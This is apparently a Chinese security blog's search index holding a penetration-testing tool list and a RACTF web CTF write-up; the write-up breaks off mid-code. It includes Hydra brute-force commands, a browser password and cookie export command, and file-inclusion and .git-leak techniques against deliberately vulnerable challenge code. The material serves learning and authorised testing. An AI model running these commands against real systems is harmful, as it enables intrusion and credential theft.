<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>渗透工具合集</title>
      <link href="/post/9448a947.html"/>
      <url>/post/9448a947.html</url>
      
        <content type="html"><![CDATA[<h1 id="渗透工具合集"><a href="#渗透工具合集" class="headerlink" title="渗透工具合集"></a>渗透工具合集</h1><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-网络服务发现"><a href="#1-网络服务发现" class="headerlink" title="1. 网络服务发现"></a>1. 网络服务发现</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>Github: <a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>简介：一款用于网络发现和安全审计的网络安全工具。</p><h3 id="2-指纹识别"><a href="#2-指纹识别" class="headerlink" title="2. 指纹识别"></a>2. 指纹识别</h3><h4 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a>wafw00f</h4><p>Github: <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>简介：Web 应用程序防火墙指纹识别工具。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">wafw00f https://example.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a>Wappalyzer</h4><p>官网：<a href="https://www.wappalyzer.com/">https://www.wappalyzer.com/</a><br>简介：浏览器插件，找出任何网站的技术堆栈。<br>​</p><h4 id="TideFinger"><a href="#TideFinger" class="headerlink" title="TideFinger"></a>TideFinger</h4><p>Github: <a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a><br>简介：一个开源的指纹识别小工具，使用了传统和现代检测技术相结合的指纹检测方法，让指纹检测更快捷、准确。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">python3 TideFinger.py -u http://target.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-Web-路径扫描"><a href="#3-Web-路径扫描" class="headerlink" title="3. Web 路径扫描"></a>3. Web 路径扫描</h3><h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><p>Github: <a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>简介：一种高级命令行工具，旨在暴力破解网络服务器中的目录和文件，又名网络路径扫描器。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">python3 dirsearch.py -u <span class="token operator">&lt;</span>URL<span class="token operator">></span> -e <span class="token operator">&lt;</span>EXTENSIONS<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h4><p>Github: <a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a><br>简介：一个高级 web 目录扫描工具，功能将会强于 DirBuster、Dirsearch、cansina、御剑。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">python3 dirmap.py -i https://target.com -lcf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="DirBuster"><a href="#DirBuster" class="headerlink" title="DirBuster"></a>DirBuster</h4><p>Github: <a href="https://github.com/thinkoaa/DirBusterUpgradedVersion">https://github.com/thinkoaa/DirBusterUpgradedVersion</a><br>简介：DirBuster 优化版本，中文界面。<br>​</p><h3 id="4-子域名收集"><a href="#4-子域名收集" class="headerlink" title="4. 子域名收集"></a>4. 子域名收集</h3><h4 id="ksubdomain"><a href="#ksubdomain" class="headerlink" title="ksubdomain"></a>ksubdomain</h4><p>Github: <a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a><br>简介：一款基于无状态子域名爆破工具，支持在 Windows/Linux/Mac 上使用，它会很快的进行 DNS 爆破，在 Mac 和 Windows 上理论最大发包速度在 30w/s,linux 上为 160w/s 的速度。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 使用内置字典爆破</span>ksubdomain -d seebug.org<span class="token comment" spellcheck="true"># 使用字典爆破域名</span>ksubdomain -d seebug.org -f subdomains.dict<span class="token comment" spellcheck="true"># 仅使用网络API接口获取域名</span>ksubdomain -d target.org -api<span class="token comment" spellcheck="true"># 完整模式,先使用网络API，在此基础使用内置字典进行爆破</span>ksubdomain -d target.org -full<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h4><p>Github: <a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a><br>简介：一款功能强大的子域收集工具。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">python3 oneforall.py --target example.com runpython3 oneforall.py --targets ./example.txt run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="二、抓包改包"><a href="#二、抓包改包" class="headerlink" title="二、抓包改包"></a>二、抓包改包</h2><h4 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h4><p>官网：<a href="https://portswigger.net/burp">https://portswigger.net/burp</a><br>简介：http(s)抓包工具，一流的漏洞扫描、渗透测试和 Web 应用安全平台。<br>​</p><h4 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h4><p>官网：<a href="https://www.wireshark.org/">https://www.wireshark.org/</a><br>简介：一个网络数据包分析软件。</p><h2 id="三、漏洞扫描"><a href="#三、漏洞扫描" class="headerlink" title="三、漏洞扫描"></a>三、漏洞扫描</h2><h3 id="1-主机漏洞扫描"><a href="#1-主机漏洞扫描" class="headerlink" title="1. 主机漏洞扫描"></a>1. 主机漏洞扫描</h3><h4 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h4><p>官网：<a href="https://zh-cn.tenable.com/products/nessus">https://zh-cn.tenable.com/products/nessus</a><br>简介：主机和 Web 漏洞扫描评估工具。</p><h4 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h4><p>Github：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a><br>简介：一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。<br>支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis 批量写公钥、计划任务反弹 shell、读取 win 网卡信息、web 指纹识别、web 漏洞扫描、netbios 探测、域控识别等功能。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">fscan.exe -h 192.168.1.1/24  <span class="token punctuation">(</span>默认使用全部模块<span class="token punctuation">)</span>fscan.exe -h 192.168.1.1/16  <span class="token punctuation">(</span>B段扫描<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-Web-漏洞扫描"><a href="#2-Web-漏洞扫描" class="headerlink" title="2. Web 漏洞扫描"></a>2. Web 漏洞扫描</h3><h4 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h4><p>官网：<a href="https://www.acunetix.com/vulnerability-scanner/">https://www.acunetix.com/vulnerability-scanner/</a><br>简介：Web 网络漏洞扫描器。</p><h4 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h4><p>Github: <a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a><br>简介：一款功能强大的安全评估工具。<br>使用：<br>【<a href="https://docs.xray.cool/">使用文档</a>】</p><pre class="line-numbers language-bash"><code class="language-bash">1. 使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描xray webscan --basic-crawler http://example.com --html-output vuln.html2.使用 HTTP 代理进行被动扫描xray webscan --listen 127.0.0.1:7777 --html-output proxy.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="pocsuite3"><a href="#pocsuite3" class="headerlink" title="pocsuite3"></a>pocsuite3</h4><p>Github：<a href="https://github.com/knownsec/pocsuite3">https://github.com/knownsec/pocsuite3</a><br>简介：Pocsuite 是由知道创宇 404 实验室打造的一款开源的远程漏洞测试框架。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># load all poc in the poc directory and save the result as html</span>pocsuite -u http://example.com --plugins poc_from_pocs,html_report<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h4><p>Github: <a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>简介：Nikto 网络服务器扫描器<br>使用：<br>【<a href="https://github.com/sullo/nikto/wiki">nikto wiki</a>】</p><pre class="line-numbers language-bash"><code class="language-bash">nikto -h http://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h4><p>Github：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>简介：XSS 漏洞测试工具<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">python xsstrike.py -u <span class="token string">"http://example.com/search.php?q=query"</span>python xsstrike.py -u <span class="token string">"http://example.com/search.php"</span> --data <span class="token string">"q=query"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h2><h3 id="1-Web-漏洞利用"><a href="#1-Web-漏洞利用" class="headerlink" title="1. Web 漏洞利用"></a>1. Web 漏洞利用</h3><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>Github: <a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>简介： SQL 注入漏洞扫描和利用工具。<br>使用:<br>【<a href="https://saucer-man.com/information_security/37.html">sqlmap 中文使用手册</a>】</p><h4 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h4><p>Github: <a href="https://github.com/AntSwordProject/AntSword">https://github.com/AntSwordProject/AntSword</a><br>简介：一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。</p><h3 id="2-信息泄漏利用"><a href="#2-信息泄漏利用" class="headerlink" title="2. 信息泄漏利用"></a>2. 信息泄漏利用</h3><h4 id="GitHack"><a href="#GitHack" class="headerlink" title="GitHack"></a>GitHack</h4><p>Github: <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>简介：一个.git 泄露利用脚本，通过泄露的.git 文件夹下的文件，重建还原工程源代码。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">python GitHack.py http://target/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="superl-githack"><a href="#superl-githack" class="headerlink" title="superl-githack"></a>superl-githack</h4><p>Github: <a href="https://github.com/super-l/superl-githack">https://github.com/super-l/superl-githack</a><br>简介：.git 信息泄露漏洞利用工具，可自动完整的下载整个项目 GIT 工程文件、获得从 git 项目创建以来的所有更新历程和源代码。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">python superl-githack.py http://www.xxx.com/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ds-store-exp"><a href="#ds-store-exp" class="headerlink" title="ds_store_exp"></a>ds_store_exp</h4><p>Github: <a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a><br>简介：一个 .DS_Store 文件泄漏利用脚本，它解析.DS_Store 文件并递归地下载文件到本地。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">python ds_store_exp.py http://www.example.com/.DS_Store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="dvcs-ripper"><a href="#dvcs-ripper" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h4><p>Github: <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>简介：一款 perl 的版本控制软件信息泄露利用工具，支持 SVN, GIT, Mercurial/hg, bz 等等。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">rip-git.pl -v -u http://www.example.com/.git/rip-hg.pl -v -u http://www.example.com/.hg/rip-bzr.pl -v -u http://www.example.com/.bzr/rip-svn.pl -v -u http://www.example.com/.svn/rip-cvs.pl -v -u http://www.example.com/CVS/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="idea-exploit"><a href="#idea-exploit" class="headerlink" title="idea_exploit"></a>idea_exploit</h4><p>Github：<a href="https://github.com/lijiejie/idea_exploit">https://github.com/lijiejie/idea_exploit</a></p><p>简介：IDE 配置文件夹（.idea）敏感信息泄露利用工具。</p><p>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">python idea_exp.py http://example.com/.idea/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="reverse-sourcemap"><a href="#reverse-sourcemap" class="headerlink" title="reverse-sourcemap"></a>reverse-sourcemap</h4><p>Github：<a href="https://github.com/davidkevork/reverse-sourcemap">https://github.com/davidkevork/reverse-sourcemap</a><br>简介：xxx.js.map 逆向还原工具<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">reverse-sourcemap -v xxx.xxx.js.map -o code<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="五、代码审计"><a href="#五、代码审计" class="headerlink" title="五、代码审计"></a>五、代码审计</h2><h4 id="Kunlun-M"><a href="#Kunlun-M" class="headerlink" title="Kunlun-M"></a><strong>Kunlun-M</strong></h4><p>Github：<a href="https://github.com/LoRexxar/Kunlun-M">https://github.com/LoRexxar/Kunlun-M</a><br>简介：KunLun-M 是一个完全开源的静态白盒扫描工具，支持 PHP、JavaScript 的语义扫描，基础安全、组件安全扫描，Chrome Ext\Solidity 的基础扫描。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">python kunlun.py scan -t tests/vulnerabilities<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="六、内网渗透"><a href="#六、内网渗透" class="headerlink" title="六、内网渗透"></a>六、内网渗透</h2><h4 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a>Metasploit Framework</h4><p>官网：<a href="https://www.metasploit.com/">https://www.metasploit.com/</a><br>简介：一款开源的安全漏洞检测工具，可以帮助安全和 IT 专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 启动</span>msfconsole<span class="token comment" spellcheck="true"># 搜索模块</span>search xxx<span class="token comment" spellcheck="true"># 使用模块</span>use module_name/module_id<span class="token comment" spellcheck="true"># 设置参数</span><span class="token keyword">set</span> key value<span class="token comment" spellcheck="true"># 执行</span>exploit/run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Viper"><a href="#Viper" class="headerlink" title="Viper"></a>Viper</h4><p>Github: <a href="https://github.com/FunnyWolf/Viper">https://github.com/FunnyWolf/Viper</a><br>简介：一款图形化内网渗透工具,将内网渗透过程中常用的战术及技术进行模块化及武器化。<br>使用文档：<a href="https://www.yuque.com/vipersec">ViperSec</a><br>​</p><h4 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h4><p>官网：<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com/</a><br>简介：一款常用于后渗透的神器，这个工具以团队作为主体，共享信息，拥有多种协议上线方式，集成了端口转发，端口扫描，socket 代理，提权，钓鱼等。除去自身功能外，Cobalt Strike 还利用了 Metasploit 和 Mimikatz 等其他知名工具的功能。</p><h4 id="HackBrowserData"><a href="#HackBrowserData" class="headerlink" title="HackBrowserData"></a>HackBrowserData</h4><p>Github：<a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a><br>简介：一个浏览器数据（密码 | 历史记录 | Cookie | 书签 | 信用卡 | 下载记录）的导出工具，支持全平台主流浏览器。</p><pre class="line-numbers language-bash"><code class="language-bash">.\hack-browser-data.exe -b all -f json --dir results --cc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="七、字典相关"><a href="#七、字典相关" class="headerlink" title="七、字典相关"></a>七、字典相关</h2><h3 id="1-常用字典"><a href="#1-常用字典" class="headerlink" title="1. 常用字典"></a>1. 常用字典</h3><h4 id="fuzzDicts"><a href="#fuzzDicts" class="headerlink" title="fuzzDicts"></a>fuzzDicts</h4><p>Github：<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a><br>简介：Web Pentesting Fuzz 字典,一个就够了。</p><h4 id="Web-Fuzzing-Box"><a href="#Web-Fuzzing-Box" class="headerlink" title="Web-Fuzzing-Box"></a>Web-Fuzzing-Box</h4><p>Github：<a href="https://github.com/gh0stkey/Web-Fuzzing-Box">https://github.com/gh0stkey/Web-Fuzzing-Box</a><br>简介：Web 模糊测试字典与一些 Payloads，主要包含：弱口令暴力破解、目录以及文件枚举、Web 漏洞…</p><h4 id="Dictionary-Of-Pentesting"><a href="#Dictionary-Of-Pentesting" class="headerlink" title="Dictionary-Of-Pentesting"></a>Dictionary-Of-Pentesting</h4><p>Github：<a href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a><br>简介：收集一些常用的字典，用于渗透测试、SRC 漏洞挖掘、爆破、Fuzzing 等实战中。</p><h4 id="password-brute-dictionary"><a href="#password-brute-dictionary" class="headerlink" title="password_brute_dictionary"></a>password_brute_dictionary</h4><p>Github：<a href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a><br>简介：嘟嘟牛、7K7K、人人网、CSDN、178 游戏网等五个平台的泄露数据密码字典。</p><h3 id="2-字典生成"><a href="#2-字典生成" class="headerlink" title="2. 字典生成"></a>2. 字典生成</h3><h4 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h4><p>Github: <a href="https://github.com/fpolit/crunch">https://github.com/fpolit/crunch</a><br>简介：创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 使用给定的字符(0123456789abcdef)生成包含最小和最大长度为6的单词的字典文件，并将输出保存到文件(-0 6chars.txt)：</span>crunch 6 6 0123456789abcdef -o 6chars.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="八、其它工具"><a href="#八、其它工具" class="headerlink" title="八、其它工具"></a>八、其它工具</h2><h3 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1. 暴力破解"></a>1. 暴力破解</h3><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><p>Github：<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a><br>简介：支持多种协议的用户名和密码爆破工具。<br>使用：</p><pre class="line-numbers language-bash"><code class="language-bash">hydra -l user -P passlist.txt ftp://192.168.0.1hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAINhydra -C defaults.txt -6 pop3s://<span class="token punctuation">[</span>2001:db8::1<span class="token punctuation">]</span>:143/TLS:DIGEST-MD5hydra -l admin -p password ftp://<span class="token punctuation">[</span>192.168.0.0/24<span class="token punctuation">]</span>/hydra -L logins.txt -P pws.txt -M targets.txt <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RACTF Web题Writeup</title>
      <link href="/post/3f3e39e4.html"/>
      <url>/post/3f3e39e4.html</url>
      
        <content type="html"><![CDATA[<h1 id="RACTF-Web-题-Writeup"><a href="#RACTF-Web-题-Writeup" class="headerlink" title="RACTF Web 题 Writeup"></a>RACTF Web 题 Writeup</h1><p>RACTF Web All AK. 🎉🎉🎉<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765964308-f0c87678-fea3-41c3-a529-577ba1c039ea.png#clientId=u832c4857-9c1d-4&amp;from=drop&amp;id=u106e408b&amp;margin=%5Bobject%20Object%5D&amp;name=iShot2021-10-09%2015.00.18.png&amp;originHeight=726&amp;originWidth=1449&amp;originalType=binary%E2%88%B6=1&amp;size=98182&amp;status=done&amp;style=none&amp;taskId=u5621f867-46e2-4250-bee2-03e576a904e" alt="iShot2021-10-09 15.00.18.png"></p><h2 id="notrequired"><a href="#notrequired" class="headerlink" title="notrequired"></a>notrequired</h2><h3 id="1-基础判断"><a href="#1-基础判断" class="headerlink" title="1. 基础判断"></a>1. 基础判断</h3><p>打开会自动跳转到/index.php?file=index.html<br>尝试<strong>任意文件读取</strong>，成功读取 /etc/passwd<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765635946-22f61fb4-d248-4f75-bf83-aa7b4f69e7fd.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=ud621217b&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=554&amp;originWidth=1160&amp;originalType=url%E2%88%B6=1&amp;size=122668&amp;status=done&amp;style=none&amp;taskId=uf8143431-893a-454c-bbb9-8a594ecc7c3" alt="image.png"></p><h3 id="2-读取文件"><a href="#2-读取文件" class="headerlink" title="2. 读取文件"></a>2. 读取文件</h3><p>使用 php://filter 过滤器读取 index.php 的 base64 编码字符串<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765635990-0428ac27-23c6-4e03-84a5-3e0cd583f0c5.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u46871228&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=565&amp;originWidth=1174&amp;originalType=url%E2%88%B6=1&amp;size=128183&amp;status=done&amp;style=none&amp;taskId=u7851d4b9-4d21-4012-8218-9bc4ce9127f" alt="image.png"><br>解码得到：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span>"location<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html");</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment">#note to myself: delete /bin/secrets.txt!</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据提示，读取 <strong>/bin/secrets.txt</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765635973-c27f68b3-05a6-47ac-9b33-d290724196a1.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u35e2fe6a&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=454&amp;originWidth=1177&amp;originalType=url%E2%88%B6=1&amp;size=86751&amp;status=done&amp;style=none&amp;taskId=u3ce5ed7a-c881-4d0c-9517-dee57189725" alt="image.png"><br>把<strong>BUHC</strong>替换为<strong>DO</strong>即为 Flag。<br>Get Flag!<br>​</p><h2 id="git-commit-m-“whatever”"><a href="#git-commit-m-“whatever”" class="headerlink" title="git commit -m “whatever”"></a>git commit -m “whatever”</h2><ol><li>打开页面，得到一段加密的字符串和提示：</li></ol><pre><code>+M/pqMuo4pevO4qE7ETogLZjXSoiLhuqpmWh21pKXOpjftRMSq+ltAaloVOlwR3cGkaBeYxLQEb2kJ7FZg4UBxawjJvpcyKebpVoz6noOnly if you could see the source code.</code></pre><ol start="2"><li>尝试扫描路径，发现存在**/.git/**路径</li></ol><p>利用.git 源代码泄露利用工具 <a href="https://github.com/lijiejie/GitHack">GitHack</a> ，得到网站源代码</p><pre><code>├── Crypt│   ├── AES.php│   ├── Base.php│   ├── Blowfish.php│   ├── DES.php│   ├── Hash.php│   ├── RC2.php│   ├── RC4.php│   ├── RSA.php│   ├── Random.php│   ├── Rijndael.php│   ├── TripleDES.php│   └── Twofish.php├── File│   ├── ANSI.php│   ├── ASN1.php│   └── X509.php├── Math│   └── BigInteger.php├── Net│   ├── SCP.php│   ├── SFTP│   │   └── Stream.php│   ├── SFTP.php│   ├── SSH1.php│   └── SSH2.php├── System│   ├── SSH│   │   └── Agent.php│   └── SSH_Agent.php├── bootstrap.php├── index.php├── openssl.cnf└── tempCodeRunnerFile.py</code></pre><ol start="3"><li> 审计代码，发现<strong>index.php</strong>里有个<strong>crypto</strong>类，存在两个方法<code>encryp()</code>和<code>decrypt()</code>，即加密和解密的方法</li></ol><p>​</p><ol start="4"><li> 解密过程</li></ol><p><img src="https://i.loli.net/2021/10/09/kBeQPfOmI7DnRFW.png#id=ET6Jr&amp;originHeight=242&amp;originWidth=820&amp;originalType=binary%E2%88%B6=1&amp;status=done&amp;style=none"></p><ol start="5"><li>调用<code>decrypt()</code>方法解密</li></ol><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$privatekey</span> <span class="token operator">=</span> <span class="token string">"mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs="</span><span class="token punctuation">;</span><span class="token variable">$encrypted</span> <span class="token operator">=</span> <span class="token string">"rI6D6aK8m1HhT1oSfsP87trNCrLMMc0MoySGaVbku4H9A3WqS1CgEbhAdZ3VWMAoFuPr9WfG2s5szKfgUFnKnzqv7CieKQvyK/tplDZp "</span><span class="token punctuation">;</span><span class="token variable">$dnc</span> <span class="token operator">=</span> crypto<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$encrypted</span><span class="token punctuation">,</span> <span class="token variable">$privatekey</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$dnc</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>采坑</li></ol><p>这里有个坑，解密代码中调用了<code>sodium_crypto_secretbox_open()</code>这个方法，而这个方法只有 (PHP 7 &gt;= 7.2.0, PHP 8) 的版本才有，使用其它 PHP 版本运行会报错<br><img src="https://i.loli.net/2021/10/09/wJnQPI1Gl74YfHC.png#id=gT4uM&amp;originHeight=191&amp;originWidth=758&amp;originalType=binary%E2%88%B6=1&amp;status=done&amp;style=none"></p><ol start="7"><li>运行解密代码，get flag！</li></ol><p><img src="https://i.loli.net/2021/10/09/6AZHgv4MYo1sDQj.png#id=crrWJ&amp;originHeight=83&amp;originWidth=728&amp;originalType=binary%E2%88%B6=1&amp;status=done&amp;style=none"></p><h2 id="madlib"><a href="#madlib" class="headerlink" title="madlib"></a>madlib</h2><h3 id="1、打开页面点击-source-得到源代码"><a href="#1、打开页面点击-source-得到源代码" class="headerlink" title="1、打开页面点击 source 得到源代码"></a>1、打开页面点击 source 得到源代码</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765708114-308ba8d8-b6cf-4e67-8ad0-4113c0aad69a.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u9355d375&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=334&amp;originWidth=642&amp;originalType=url%E2%88%B6=1&amp;size=36486&amp;status=done&amp;style=none&amp;taskId=ud5e33be0-6ddf-4036-bec6-35ddf705d8c" alt="image.png"></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_from_directoryapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/madlib'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">madlib</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>request<span class="token punctuation">.</span>json<span class="token 